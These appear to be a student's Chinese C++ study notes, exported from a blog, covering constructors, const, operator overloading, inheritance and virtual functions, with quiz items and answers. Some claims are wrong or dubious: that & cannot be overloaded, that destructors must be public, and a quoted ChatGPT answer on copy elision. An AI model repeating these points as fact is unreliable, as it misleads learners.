class::static_count = 1; 静态成员函数 没有 this指针\n看到static int a;就要找一下看看有没有在类之外初始化\n在C++中，静态成员函数的主要目的是访问静态成员。getTotal()、getPoints() 当然也可以声明为普通成员函数，但是它们都只对静态成员进行操作，加上 static 语义更加明确。 和静态成员变量类似，静态成员函数在声明时要加 static，在定义时不能加 static。静态成员函数可以通过类来调用（一般都是这样做），也可以通过对象来调用 a1.value_of_a(); A::value_of_a(); //只能对静态成员变量进行操作，不能使用非静态成员变量 构造函数 # 1.在写了一个有传参的构造函数后，系统就不会生成默认的无参构造函数了\n2.下面关于构造函数和成员常量描述正确的是\nA.构造函数因为是用来初始化的，因此在构造函数的任何对成员常量的赋值都是被允许的\nB.构造函数虽然是用来初始化的，但常量必须在声明的时候就定义，如const int a=1;\nC.构造函数也能对成员常量初始化（要在初始化列表里初始化）\n**只有（c）正确\n构造函数不能对已经初始化定义的成员常量初始化\n3.\nPointer C = Pointer(2,4);//等同于Pointer C（2,4）；\nclass Pointer { int row; int col public： //无参构造函数 Pointer(){} //调动缺省构造函数时，不要加括号，例如：Pointer c1； //一旦没有实参却加了括号，C++为了兼容于C，就会将其识别为函数的声明 //有参构造函数 Pointer(int r,int c) { row = r; col = c; } //调动有参构造函数时，带括号就必须传入实！！例如：Pointer c(1,2)； //还可以使用如下的写法： Pointer C = Pointer(2,4);//等同于Pointer C（2,4）； 采用列表的方式来初始化对象\nclass Object： { int value; public: Object(int x = 0):value(x){} //等同于{value = x;} }; class Rectangle { private: int left; int top; int right; int bottom; public: // 一次定义默认构造函数和带参的构造函数 Rectangle(int e = 0, int t = 0, int r = 0, int b = 0) : left(e), top(t), right(r), bottom(b) {} } 类中成员的构建顺序！！！\n按照设计的顺序，即我们声明的顺序 看下面的代码：\nclass Object { int num; int sun; public: Object(int x = 0):sum(x),num(sum){} void print() const { cout\u0026lt;\u0026lt;num\u0026lt;\u0026lt;\u0026#34; \u0026#34;\u0026lt;\u0026lt;endl; } }; int main() { Object obj; return 0; } //即便构造函数书写的列表顺序是先构建sum，再构建num，但是，其仍会根据声明顺序先构建num，由于sum还未进行构建，因此，num的值为随机值，而sum的值为0 4.构造函数不必是public， private 的构造函数不能使用以下的定义 假设A的构造是私有的， 定义 A a;或者 A*a = new A都是错的。因为A()为私有函数，外部不能直接操作。\n一般方法是另外再定义一个public的函数自动调用A（）\nclass A { private: A(); public: static A* GetA() {return new A} } //否则： #include\u0026lt;iostream\u0026gt; using namespace std; class A{ A(){ cout\u0026lt;\u0026lt;\u0026#34;hello world\u0026#34;\u0026lt;\u0026lt;endl; } }; int main(){ A a; } //因为调用了private成员函数(即构造函数)而编译错误 而析构函数必须给成公有的，因为有六个函数（构造函数、析构函数、拷贝构造函数、赋值函数、\u0026amp;（取地址）运算符重载、const\u0026amp;（取地址）运算符重载）如果用户不显示给出来，系统会根据情况自动合成。 当析构函数显示给出来后，系统便不会合成，但是当对象生命周期结束后，系统便调用，此时便会引发错误。\n5.阅读：\n构造函数必须是public吗_c++ 构造函数，析构函数必须要给成公有的吗？\n这是一道面试题，记得当时回答的并不好，因为我们对构造函数经常使用，例如单例模式下构造函数我们会声明为私有的，其他情况下构造函数我们都会声明为公有的，但是析构函数是否必须声明为公有的，还真没注意。下面我们就一起学习下。\n(一)一个类的析构函数只能有一个，也不能重载\n1.类的析构函数，是在对象的生命周期结束后，由系统自动调用的。\n2.该函数不需任何参数，不需要传入任何参数，如果非要写一个带参数的析构函数，则会造成编译器的抱怨，造成二义性，这一点和构造函数不同，构造函数可以根据传入的参数，选择合适的构造函数。构造函数可以显示调用，而析构函数系统负责调用，程序无法控制其调用时机。\n(二)构造函数，析构函数必须是公有的吗？\n1.析构函数必须给成公有的，因为对象生命周期结束后，系统会调用，如果不是公有的则会引发错误\n2.构造函数可以是公有的，私有的，保护的 ———————————————— 版权声明：本文为CSDN博主「weixin_39530557」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。 原文链接：https://blog.csdn.net/weixin_39530557/article/details/111339796\nnew与delete # 一、new和malloc的区别 1.都在堆区开辟空间，若堆区空间不足失败，malloc返回一个空指针，new抛出异常throw bad_alloc 2.malloc是C库函数，只是开辟空间，但无对象，只有一个动作，必须通过定位new来构建对象。 3.new是标识符，关键字，运算符（可以重写）申请开辟空间，调动构造函数构建对象，两个动作。 4.new会自动计算对象的大小\n5.new是保留字,不需要头文件支持.\nmalloc需要头文件库函数支持.\n二、free和delete\n1.free释放空间\n2.delete调动指针指向的对象的析构函数释放资源，然后系统释放空间，注销对象(动态)\n3.动态创建的对象，不显式delete不会自动调用析构函数\n三、new的三种调动形式\n1.运算符用法（关键字调动） 开辟空间，调动构造函数构建对象\nObject *op = new Object(10); //Object *op = NULL; //op = new Object(10); 2.函数用法（函数调动）\n和malloc很像，此时不会调动构造函数，只申请空间， 但区别是：此时申请失败仍然抛出异常throw bad_alloc\nObject *os = (Object*)::operator new(sizeof(Object)); 3.定位new\nnew(有效地址空间) 并不开辟空间，调动构造函数,os已经申请到空间，在os指定的空间中创建对象 new(os) Object(100); os-\u0026gt;~Object(); 定位new可以完成对象的二次构建 new(\u0026amp;a) Object(10000); //a.Object(10000); new申请一个对象和一组对象的语法区别（）[ ] Object obja(20);//.stack——\u0026gt;函数开始调动构建，函数结束调动析构 Object objb[10];//.stack——\u0026gt;调动10次构建，函数结束调动10次析构 Object *s = new Object(n);//.heap Object *p = new Object[n];//.heap delete s; delete []p;//编译器会自动计算出销毁多少个对象（已经记录在案） 纯虚函数 # 构造函数不能是虚函数 # 而且，在构造函数中调用虚函数，实际执行的是父类的对应函数，因为自己还没有构造好, 多态是被disable的。\n析构函数可以是虚函数 # 纯虚函数通常没有定义体，但也完全可以拥有, 甚至可以显示调用。\n析构函数可以是纯虚的，但纯虚析构函数必须有定义体，因为析构函数的调用是在子类中隐含的。\nclass Base { public: Base(){} virtual ~Base() = 0; //pure virtual }; Base::~Base()//function body { } 非纯的虚函数必须有定义体，不然是一个错误\n虚函数是动态绑定的，也就是说，使用虚函数的指针和引用能够正确找到实际类的对应函数，而不是执行定义类的函数。这是虚函数的基本功能，就不再解释了。\n","date":"June 30, 2023","permalink":"/posts/c++/homework/c++%E7%90%86%E8%AE%BA1/","section":"Posts","summary":"cin与cout # 第一周T8，T9，T10 下面语句的输出是？","title":"C++理论1"},{"content":" 构造函数 # 1.构造函数1的参数列表\n//以下两个构造函数都是没有参数时调用的构造函数，会导致编译错误！！！ class first { Foo() { x = 1; y = 1; } Foo(int x_ = 10, int y_ = 10) { x = x_; y = y_; } }; 2.构造函数的调用顺序问题\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;string\u0026gt; using namespace std; class A{ mutable int a; public: A(){ cout \u0026lt;\u0026lt; \u0026#34;A\u0026#39;s Constructor called \\n\u0026#34;; } ~A(){ cout \u0026lt;\u0026lt; \u0026#34;A\u0026#39;s Destructor called \\n\u0026#34;; } }; class B{ A a; public: B(){ cout \u0026lt;\u0026lt; \u0026#34;B\u0026#39;s Constructor called \\n\u0026#34;; } ~B(){ cout \u0026lt;\u0026lt; \u0026#34;B\u0026#39;s Destructor called \\n\u0026#34;; } }; int main(int argc, char const *argv[]){ B b1; } /* A\u0026#39;s Constructor called B\u0026#39;s Constructor called B\u0026#39;s Destructor called A\u0026#39;s Destructor called */ B类中含有A类，先按照B类的参数定义顺序来定义成员数据，再调用构造函数来初始化成员数据，所以先调用A的构造函数，再调用B的构造函数。\n析构函数则是由外到内调用的。\n或者按照定义顺序：\n设已经有A,B,C,D4个类的定义，程序中A,B,C,D析构函数调用顺序为？ C c; void main() { A*pa=new A(); B b; static D d; delete pa; } 首先，由于 c 是一个自动对象，其析构函数会在它所在的作用域结束时自动调用。(整个程序的最后) 接下来，由于 pa 是通过 new 运算符动态分配得到的，需要使用 delete 运算符手动释放内存。因此，在 delete pa; 语句执行时，会先调用 A 类的析构函数，再释放内存。 最后，在程序结束时，会先调用 B 类的析构函数，然后调用 D 类的析构函数。 综上所述，A、B、C、D 类的析构函数调用顺序为：A 的析构函数 -\u0026gt; B 的析构函数 -\u0026gt; D 的析构函数 -\u0026gt; c 的析构函数 。\n请注意，静态对象的析构函数在程序结束时调用，而不是在其所在的函数结束时调用。静态对象的生命周期从程序开始到结束，析构函数的调用顺序与它们的定义顺序保持一致。\nstatic类对象只有当main函数结束了才会调用析构函数。\n\u0026#34;main() terminates\u0026#34; \u0026#34;static class Destructor is executed\u0026#34; 拷贝构造函数 # #include \u0026lt;iostream\u0026gt; #include \u0026lt;string\u0026gt; using namespace std; class A{ mutable int a; public: A(){ cout\u0026lt;\u0026lt;\u0026#34;Default constructor called\\n\u0026#34;; } A(const A\u0026amp; a){ cout\u0026lt;\u0026lt;\u0026#34;Copy Constructor called\\n\u0026#34;; } }; int main(int argc, char const *argv[]) { A obj; A a1 = obj; //也会用到拷贝构造函数 A a2(obj); } /* Default constructor called Copy Constructor called Copy Constructor called */ 1.传递给拷贝构造函数的对象 _______\nA.必须通过引用传递\nB.必须通过值传递 （A）\n2.下面哪种情况会发生复制省略？\nA.函数返回一个临时对象\nB.函数参数是一个右值引用\nC.初始化一个对象时使用同类型的另一个对象\nD.上述都是（D）\n复制省略（copy elision）是编译器的一种优化技术，在特定情况下可以避免对象的拷贝或移动操作，从而提高程序的性能和效率。以下是几种情况可能会触发复制省略：\r返回值优化（RVO）：\r当函数返回一个对象时，如果被返回的对象是一个局部对象，且该对象没有被其他代码引用，编译器可以将这个局部对象直接构造在调用者提供的存储空间中，而不进行实际的拷贝或移动操作。\r命名返回值优化（NRVO）：\r类似于返回值优化，当函数返回一个对象时，如果被返回的对象是一个局部对象，并且该对象在函数内部被命名并声明为函数返回值，编译器可以直接将这个局部对象构造在函数外部的目标对象中，而不进行实际的拷贝或移动操作。\r参数传递优化：\r当将一个对象作为函数参数进行传递时，如果传递的对象是一个临时对象，并且该临时对象没有被其他代码引用，编译器可以直接将这个临时对象构造在函数内部的目标对象中，而不进行实际的拷贝或移动操作。 3.下面哪种写法可以利用复制省略提高性能？\nA.std::string s = \u0026quot;hello\u0026quot;; B.std::string s(\u0026quot;hello\u0026quot;); C.std::string s = std::string(\u0026quot;hello\u0026quot;); D.上述都是 （B）\nChatGPT:\n在上述选项中，选项 B 可以利用复制省略（copy elision）提高性能。\n复制省略是一种编译器的优化技术，在某些情况下，可以避免不必要的对象拷贝或移动操作，从而提高程序的性能和效率。\n在选项 B 中，使用直接初始化语法创建 std::string 对象 s，并将 \u0026ldquo;hello\u0026rdquo; 作为参数传递给构造函数。由于这里只涉及一次对象的直接初始化，编译器可以通过复制省略来避免额外的拷贝操作。\n在其他两个选项中，都使用了赋值操作符，会导致初始化过程中发生一次拷贝操作。尽管现代编译器通常可以进行 RVO（返回值优化）或 NRVO（命名返回值优化）等优化来减少对象拷贝的开销，但仍然不如直接初始化语法在性能上高效。\n因此，在这个特定的情况下，选项 B 的写法可以通过复制省略提高性能。\nconst # 1.const类型的对象只能调用const成员函数\n2.开发者不可以将构造函数设置const成员函数\n3.当一个对象按值传递给函数时，函数会在栈上创建一个新的对象，并将原始对象的值复制到这个新对象中。函数在执行过程中对该副本进行操作，而不会影响原始对象。\n4.定义const对象\n在 C++ 中，const 也可以用来修饰对象，称为常对象。一旦将对象定义为常对象之后，就只能调用类的 const 成员（包括 const 成员变量和 const 成员函数）了。\r定义常对象的语法和定义常量的语法类似：\rconst class object(params);\rclass const object(params);\r当然你也可以定义 const 指针：\rconst class *p = new class(params);\rclass const *p = new class(params);\rclass为类名，object为对象名，params为实参列表，p为指针名。两种方式定义出来的对象都是常对象。 5.\nconst成员函数是指在C++中，被声明为const的成员函数。const成员函数在类内部或类外部定义时使用const关键字进行标识，并且在函数签名的末尾加上const修饰符。\rconst成员函数有以下特点：\r不修改对象状态：const成员函数承诺不会修改类的数据成员。它们可以读取对象的数据成员和调用其他const成员函数，但不能修改对象的任何非mutable成员。\r保护对象的常量性：const成员函数在被调用时，如果对象为const或通过const引用或指针调用，则只能调用const成员函数。\r成员函数重载：同名的非const成员函数和const成员函数可以共存，并根据调用对象的常量性来确定具体调用哪个函数。\r常量对象调用：当使用常量对象调用成员函数时，只能调用const成员函数。这样可以确保常量对象的状态不会被修改。\r通过在成员函数的声明和定义中添加const关键字，可以将其附加的常量属性表达出来，在编译器层面进行类型检查和限制，提供更安全和可靠的代码编写方式。 6.同一个程序中的一个函数可以同时有const和non-const两个版本。这种情况下，这两个版本被视为函数重载，根据调用时的对象是否为const对象来选择合适的版本进行调用。\n考虑以下示例：\nclass MyClass {\rpublic:\rvoid function() {\r// 非常规范的函数实现\r}\rvoid function() const {\r// 常规范的函数实现\r}\r}; 上述代码定义了一个名为function的成员函数，并分别提供了一个非const版本和一个const版本。非const版本用于对非const对象进行操作，而const版本用于对const对象进行操作。\n当非const对象调用该函数时，将会调用非const版本的函数；当const对象调用该函数时，将会调用const版本的函数。通过这种方式，可以实现对不同类型（const和非const）的对象进行特定的操作，并保证不改变const对象的状态。\n使用const和非const版本的函数重载，可以提高程序的灵活性和可读性，在不改变对象状态的情况下，可以对const对象进行操作，避免意外修改对象的行为。\n7.如果在一个类中声明以下4个重载函数，有哪两个是互相冲突的？\nPoint fun1(); // 1 const Point fun1(); // 2 Point fun1() const; // 3 const Point fun1() const; // 4 （1与2冲突，3与4冲突）\n这是因为函数重载需要根据函数的参数列表和函数的顶层 const（对于非成员函数而言）来进行区分，但不考虑函数的返回类型。只有函数的返回类型不同时，它们会被视为相同的函数，产生冲突。所以1与2相冲突。\n类中存在后置const的常函数，与普通类成员函数之间可以实现重载。\n注：后置const作用在与this指针上，使其原本的 type * const this 指针转变为 const type * const this指针，因此在声明为后置const的常对象中不可修改类成员变量（mutable与const_cast除外）。 //前置只影响返回值！！！ default # class B { public: int func() = default; // 1 B(int, int) = default; // 2 B(int = 0) = default; // 3 };//1 2 3 都会导致编译错误 // non-special member functions can\u0026#39;t be defaulted(非特殊成员函数不能使用default) class B { public: // Error, func is not a special member function. int func() = default; // Error, constructor B(int, int) is not a special member function. B(int, int) = default; // Error, constructor B(int=0) has a default argument. B(int = 0) = default; }; int main() { return 0; } delete # 禁用成员函数的使用。这是通过附加= delete说明符到该函数声明的结尾来完成的。删除的函数是隐式内联的，删除的函数定义必须是函数的第一个声明。\n必须在函数第一次声明的时候将其声明为 deleted 函数！！！\nclass C { public: C(); }; C::C() = delete; explicitly deleted\n禁用拷贝构造函数：\nclass A { public: A(int x): m(x) { } // Delete the copy constructor A(const A\u0026amp;) = delete; // Delete the copy assignment operator A\u0026amp; operator=(const A\u0026amp;) = delete; int m; }; 禁用不需要的参数转换:\nclass A { public: A(int) {} // Declare the conversion constructor as a deleted function. Without this step, // even though A(double) isn\u0026#39;t defined, the A(int) would accept any double value // for it\u0026#39;s argumentand convert it to an int A(double) = delete; }; 初始化成员列表 # 成员是按照他们在类中出现的顺序进行初始化的，而不是按照他们在初始化列表出现的顺序初始化的，看代码。\nclass foo{ int i ; int j ; foo(int x):j(x), i(j){} // i值未定义 }; 使用初始化列表除了可以提升程序性能外，还可以完成一些使用常规构造函数无法完成的功能。\n通过初始化列表，可以在对象的构造过程中直接对成员变量进行初始化。这种方式可以避免在构造函数体内先执行默认初始化，然后再赋值的操作，提高了效率。\n此外，使用初始化列表还可以完成以下功能：\n初始化常量成员变量：类中的常量成员变量必须在初始化列表中进行初始化，因为它们不能通过赋值语句来修改。 初始化引用成员变量：引用成员变量必须在对象构造时进行初始化，并且无法在构造函数体内修改引用目标。因此，只能在初始化列表中对引用成员变量进行初始化。 调用基类的构造函数：派生类的构造函数在调用之前会自动调用基类的构造函数。通过初始化列表，可以明确指定要调用的基类构造函数以及传递给基类构造函数的参数。 对象成员变量的初始化：在类中包含其他类对象作为成员变量时，可以使用初始化列表来初始化这些成员对象。 总而言之，初始化列表不仅可以提升程序性能，还可以在构造对象时实现特定的初始化需求，如初始化常量或引用成员变量、调用基类构造函数等。\nclass Test { public: int first; int second; Test(int value): second(value), first(second) {} }; int main() { Test t(1); cout \u0026lt;\u0026lt; t.first \u0026lt;\u0026lt; endl; return 0; } 但是，在初始化列表中，second 后于 first 进行初始化，导致 first 使用了未被初始化的 second 的值，从而引发未定义行为。\n1.成员变量在使用初始化列表初始化时，与构造函数中初始化成员列表的顺序无关，只与定义成员变量的顺序有关\n2.如果不使用初始化列表初始化，在构造函数内初始化时，此时与成员变量在构造函数中的位置有关。\n3.（构造函数调用顺序：）\nB中有类A成员变量：\nA构造调用 - B构造调用 - B析构调用 - A析构调用\n4.变量的初始化顺序就应该是：\n1 基类的静态变量或全局变量\n2 派生类的静态变量或全局变量\n3 基类的成员变量\n4 派生类的成员变量\n重载 # 1.无法被重载的运算符 # 在C++中，有一些运算符是无法被重载的。以下是无法被重载的运算符列表：\n成员访问运算符：. 和 .*。 域解析运算符：::。 条件运算符（三元运算符都不能重载）：?:。 作用域运算符：sizeof。 类型运算符：typeid。 取地址运算符：\u0026amp;。 成员指针运算符：.* 和 -\u0026gt;*。 这些运算符具有特定的语法和语义，无法通过重载改变其行为。\n2.一元运算符的正确重载 # /* Obj Obj::operator+(const Obj\u0026amp; obj) Obj Obj::operator+() Obj Obj::operator\u0026lt;+\u0026gt;(const Obj\u0026amp; obj) Obj Obj::operator(+)(const Obj\u0026amp; obj) */ 一元运算符 + 的重载函数只有一个参数，即被操作的对象本身。因此，它不需要额外的参数来进行操作。重载函数的返回类型应该是 Obj 类型，表示对运算符操作后得到的新对象。\n所以，正确的声明是：\nObj Obj::operator+(); 3.有些运算符只能用成员函数进行重载 # 二进制运算符=（赋值），[]（数组订阅），-\u0026gt;（成员访问）以及n元()（函数调用）运算符必须始终实现为成员函数，因为语言的语法要求它们。 “=” 号 原因：在进行赋值的时候会调用构造函数，比如int a, a = 5. 会执行两次构造函数，如果没重载\u0026quot;=\u0026quot;，会调用默认的；如果重载了会调用重载后的。如果对\u0026quot;=\u0026ldquo;用友元函数进行重载，友元函数只是类的“朋友”，不是类的成员函数，便会出现以下情景：程序会出现两种矛盾 1.认为没有重载赋值运算符的成员函数，调用相应的构造函数 2.在全局范围内，又重载了赋值运算符函数，赋值语句正好和这个函数匹配上了，也会去调用这个函数 出现了矛盾 -\u0026gt;、[]、()同样也是这样\n4.\u0026laquo;运算符只能用非成员函数进行重载 # 原因：运算符作为成员函数时，其左侧运算对象必须是运算符所属类的一个对象， 显然 “\u0026laquo;” 不是\n5.非成员函数重载运算符直接在类外部声明定义即可,也可以定义为类的友元函数 # 选择非成员函数重载运算符的另一个原因是为了使该运算符可交换。\n如果我们将运算符重载为类的成员函数，那么操作数的顺序是固定的，左操作数是调用该成员函数的对象。但是，通过将运算符重载为非成员函数，我们可以在不同类型的操作数之间进行交换。\n例如，对于二元运算符 +，我们可以定义两个重载函数：一个是成员函数形式的重载，另一个是非成员函数形式的重载。这样，我们既可以使用对象相加，也可以通过操作数顺序的交换来实现相同的结果。\ncpp复制代码class MyClass { public: int value; MyClass(int v) : value(v) {} // 成员函数形式的重载 MyClass operator+(const MyClass\u0026amp; other) { return MyClass(value + other.value); } }; // 非成员函数形式的重载 //MyClass为返回类型，有两个参数 MyClass operator+(const MyClass\u0026amp; obj1, const MyClass\u0026amp; obj2) { return MyClass(obj1.value + obj2.value); } 通过这种方式，我们可以使用以下两种方式执行相同的操作：\ncpp复制代码MyClass obj1(5); MyClass obj2(10); MyClass result1 = obj1 + obj2; // 使用成员函数形式的重载 MyClass result2 = obj2 + obj1; // 使用非成员函数形式的重载（交换了操作数顺序） 这种可交换性可以提高代码的灵活性和可读性。\na+b operator+(a,b) a.operator+(b) -a operator-(a) a.operator-() a++ operator++(a,0) a.operator++(0) –a operator–(a) a.operator–(); 左边为友元函数，右边为类成员函数\n友元函数 # friend void sum_1(A \u0026amp;a, B \u0026amp;b); // 全局函数 sum_1 friend void A::sum_2(B \u0026amp;b); // 友元函数 A::sum_2 选项纠正后：\nA.友元函数不是类的成员函数 B.友元函数破坏了类的封装性和隐藏性 C.友元函数能访问类的 protected 成员也能能访问 private 成员 D.友元函数没有类的对象的this指针 段错误 # 下面哪种情况会导致段错误？ A.访问了不存在或者受保护的地址空间 B.访问了未初始化或者已经释放的指针 C.访问了越界或者无效的数组元素 D.上述都会 （D） ","date":"June 30, 2023","permalink":"/posts/c++/homework/c++%E7%90%86%E8%AE%BA2/","section":"Posts","summary":"构造函数 # 1.构造函数1的参数列表 //以下两个构造函数都是没","title":"C++理论2"},{"content":" explicit # 当一个类的构造函数有多个参数，除第一个参数外其它都有默认值时，explicit 仍然有效\nexplicit 关键字只能用于类的构造函数和转换函数声明，不能用于普通函数声明。\n花括号列表初始化 # class A { public: explicit A(int x) : value(x) {} int value; }; void f(A a) { ... } int main() { f(42);//error f(A(42));//调用构造函数 f(A{42})；//直接初始化赋值value=42 return0; } class Test { int a; int b; public: C(int i, int j); }; Test t{0,0}; //C++11 only，相当于 Test t(0,0); Test* pT=new Test{1,2}; //C++11 only，相当于 Test* pT=new Test(1,2); int* a = new int[3]{1,2,0}; //C++11 only 函数对象 # class Add { public: int operator()(int a, int b) const { return a + b; } }; 调用语法： Add()(1,2) //匿名对象 Add my_name() (a,b) //myname的对象 使用函数对象的优点: 1.可以很好的与STL算法结合 2.函数对象比函数指针快一点，有更高的运行效率 3.函数对象会支持状态 1.函数类 # 一个函数类，即一个重载了括号操作符()的类。当用该类的对象调用此操作符时，其表现形式如同普通函数调用一般，因此取名叫函数类。举个最简单的例子：\nclass cmp { public: booloperator () (constint\u0026amp; a, constint\u0026amp; b) { return a\u0026gt;=b; } }; cmp my_cmp; result = my_cmp(3,4);//0 class A { public: void operator() () { cout\u0026lt;\u0026lt;\u0026#34;Hello\u0026#34;\u0026lt;\u0026lt;endl; } }; A a; a();//形式上等同于直接调用函数f: void f() { cout\u0026lt;\u0026lt;\u0026#34;Hello\u0026#34;\u0026lt;\u0026lt;endl; } 2.std::function类 # 当你需要一个非模板函数对象作为类的成员或者函数参数时，你必须指定函数对象的具体类型。C++中的函数对象并没有一个基类，但是标准库提供了一个模板类std::function来代表所有的函数对象。\n**3.**下面哪个选项不是函数对象的要求？\nA.它必须包含一个函数调用运算符。\nB.它必须重载函数调用运算符\nC.它必须继承自std::function\nD.它可以是一个类或结构体\n（C）\n4.函数对象可以被默认构造函数初始化，一个函数对象类具有一个默认构造函数。\n继承 # 1.公有继承使得派生类可以访问基类中的公有成员。 # 当使用公有继承时，基类的公有成员在派生类中仍然具有公有访问权限，可以被派生类的对象直接访问和使用。\n保护继承和私有继承都限制了对基类成员的访问权限。保护继承下，基类的公有成员在派生类中变为保护成员，只能被派生类自身及其子类访问，无法被外部对象直接访问。私有继承下，基类的公有成员在派生类中变为私有成员，只能由派生类自身访问，外部对象无法直接访问。\n2.子类只能通过子类对象访问父类保护成员 # #include \u0026lt;iostream\u0026gt; class Base { public: Base(int id) : m_id(id) {} void GetId() { m_id++; std::cout \u0026lt;\u0026lt; m_id \u0026lt;\u0026lt; std::endl; } protected: void GetZero() { std::cout \u0026lt;\u0026lt; 0 \u0026lt;\u0026lt; std::endl; } private: int m_id; }; class Child : public Base { public: Child() : Base(6) {} void GetIdInChild() { GetId(); } void GetZeroInChild() { GetZero(); //访问protected成员需要用过子类对象！！！ } }; int main() { Child child; child.GetId();//可以 child.GetZero();//报错 child.GetZeroInChild();//可以 return 0; } 3.派生类的对象不能访问派生类继承基类的公有成员和保护成员 # 派生类的内部成员才可以访问！\n4.派生类对象不一定比基类对象大。 # 可以是一样大的！\n有可能子类只是改写父类的方法而已，并没有增加其自身的数据成员，则大小一样，故错误\n下面关于继承说法不正确的是: A.继承可以使用现有类的所有功能，并在无需重新编写原来类的情况下对这些功能进行扩展。 B.继承体系中派生类应体现出与基类的不同。 C.派生类对象一定比基类对象大。 D.继承呈现了面向对象程序设计的层次结构，体现了由简单到复杂的认知过程。 （C） 5.基类指针可以指向一个派生类对象，但派生类指针不能指向基类对象 # 派生类可以使用基类的指针或引用指向基类对象或派生类对象，但反过来就不正确了\n6.关于构造函数的调用顺序 # 由基类再到派生类\n基类构造函数在派生类构造函数之前调用。\n基类析构函数在派生类析构函数之后调用。\nclass A {} class B : public A {} class C : public B {} C my_obj(); /*顺序： A() is called. B() is called. C() is called. ~C() is called. ~B() is called. ~A() is called.*/ 7.构造函数的隐式调用和显式调用 # 注意：派生类的析构函数不能显式调用基类的析构函数。\n通过派生类的构造函数调用基类的构造函数有两种方式：隐式调用和显式调用。\n所谓隐式调用，就是在派生类的构造函数中不指定对应的基类的构造函数，这个时候调用的是基类的默认构造函数(即含有默认参数值或不带参数的构造函数)。\n而所谓显式调用，就是在派生类的构造函数中指定要调用的基类的构造函数，并将派生类构造函数的部分参数值传递给基类构造函数。\n注：除非基类有默认的构造函数，否则必须采用显式调用。\n重定义 # 在基类和子类中，可以存在相同名称和形参列表的函数，当基类函数没有virtual关键字时，形成的是重定义\n1.重名就会导致重定义（同名隐藏）：\n（1）基类与子类函数名字相同，参数不同，形成的是重定义（隐藏），不是重载\n（2）成员函数在同一个类里面同名，此时构成了重载，但变量一定不能同名\n（3） 如果派生类的函数和基类的函数同名，但是参数不同，此时，不管有无virtual，基类的函数被隐藏。\n如果派生类的函数与基类的函数同名，并且参数也相同，但是基类函数没有vitual关键字，此时，基类的函数被隐藏（如果相同有Virtual就是重写覆盖了）。\n重载：函数名相同，函数的参数个数、参数类型或参数顺序三者中必须至少有一种不同。函数返回值的类型可以相同，也可以不相同。发生在一个类内部。 重定义：也叫做隐藏，子类重新定义父类中有相同名称的非虚函数 ( 参数列表可以不同 ) ，指派生类的函数屏蔽了与其同名的基类函数。可以理解成发生在继承中的重载。 重写：也叫做覆盖，一般发生在子类和父类继承关系之间。子类重新定义父类中有相同名称和参数的虚函数。(override) #include\u0026lt;iostream\u0026gt; using namespace std; class A{ public: void f(int a) { cout \u0026lt;\u0026lt; \u0026#34;A\u0026#34; \u0026lt;\u0026lt; endl; } }; class B : public A{ public: void f() //改为g() { cout \u0026lt;\u0026lt; \u0026#34;B\u0026#34; \u0026lt;\u0026lt; endl; } }; int main() { B b; b.f(1);//未改为g();编译错误 b.f(2);//改为g();编译成功 } 从派生类中对象中访问基类成员函数（已重定义） my_Child.Base::f() 1.在BASE类声明了公共成员函数void set_i()，派生类DERIVED使用private继承访问控制，可以使用“访问声明”恢复为原来的访问控制方式，访问声明的形式为:\nusing DERIVED::set_i; 在派生类中使用private继承时，基类的公共成员函数会变为私有成员，在外部无法直接访问。使用访问声明using DERIVED::set_i;可以将基类的set_i()函数恢复为可访问的方式。这样就可以在派生类中通过派生类对象访问基类的set_i()函数了。\n2.创建派生类对象时构造函数的调用次序 # A.最先调用虚基类的构造函数\nB.其次调用普通基类的构造函数，多基类按照初始化列表中的次序调用\n（B错）应该是继承时的顺序，不是初始化列表\nC.再次调用对象成员的构造函数，按类声明中对象成员出现的次序调用\nD.最后执行派生类的构造函数\n#include\u0026lt;iostream\u0026gt; using namespace std; class A{ public: A(int x){ cout\u0026lt;\u0026lt;\u0026#34;A\u0026#34;\u0026lt;\u0026lt;x; } }; class B{ public: B(int x) { cout \u0026lt;\u0026lt; \u0026#34;B\u0026#34;\u0026lt;\u0026lt;x; } }; class C: public B, public A{ public: C(int x=3):A(1), B(2){ cout\u0026lt;\u0026lt;\u0026#34;C\u0026#34;\u0026lt;\u0026lt;x; } }; int main() { C c; } //输出：B2A1C3 如果是： class C: public A, public B{ //则为：A1B2C3 看出现在类中的顺序（此处为继承顺序） 3.基类的类指针可指向派生类，反之不行 # 多继承 # 1.多继承的父类对象构造顺序按照派生类声明时列出的次序、从左到右调用\n2.多继承中，如果父类对象同时继承同一虚基类，那么虚基类的构造函数只会调用一次\n重写 # 重写需要注意：\n1、 被重写的函数不能是static的。必须是virtual的\n2 、重写函数必须有相同的类型，名称和参数列表\n3 、重写函数的访问修饰符可以不同。\n虚函数 # 有关虚函数内容参考以下链接：\n虚函数详解_~青萍之末~的博客-CSDN博客\nc++虚函数详解（你肯定懂了）_戴着眼镜看不清的博客-CSDN博客\nC++的精髓——虚函数-博客\n1.\r以下关于虚函数的说法正确的是\rA.虚函数不能在另一个类中被声明为友元函数\rB.虚函数只能在类定义的函数原型声明中，不能再成员函数的函数体实现的时候声明\rC.一个虚函数无论被公有继承多少次，它仍然保持其虚函数的特性\rD.定义了虚函数后，程序中声明的指向基类的指针可以指向其派生类\r（B C D）\r2.\r以下描述正确的是\rA.一个类可以在一个类族中既被用作虚基类，也被用作非虚基类\rB.派生类的构造函数的成员初始化列表中必须列出对虚基类构造函数的调用\rC.在派生类的对象中，同名的虚基类只产生一个虚基类子对象，而非虚基类产生各自的子对象\rD.在一个成员初始化列表中同时出现对虚基类和非虚基类构造函数的调用时，非虚基类的构造函数先于虚基类的构造函数执行\r（A C）\r3.\r以下哪些说法是正确的\rA.如果一个函数在基类中定义为虚函数，则它在其所有派生类中自动为虚函数。 派生类的函数声明中不需要添加关键字virtual\rB.如果一个函数不会被重新定义，那么在不将其声明为虚拟的情况下效率更高，因为在运行时动态绑定虚拟函数需要更多的时间和系统资源\rC.一个虚函数可以在几个派生类中实现。 C++ 在运行时动态绑定函数的实现，由变量引用的对象的实际类决定。\rD.编译器在编译时根据参数类型、参数个数、参数的顺序找到匹配的函数\rStandard Answer: D, A, B, C\r4.\r以下哪些说法是正确的\rA.私有成员只能从类内部访问，而公共成员可以从任何其他类访问。\rB.基类中的受保护数据字段或受保护函数可以在其派生类中按名称访问。\rC.任何其他程序都可以通过名称访问类中的公共数据字段或函数。\rStandard Answer: A, B, C\r5.\r以下哪个是抽象函数\rA.virtual double getArea();\rB.virtual double getArea()=0;\rC.double getArea()=0;\rD.double getArea();\rStandard 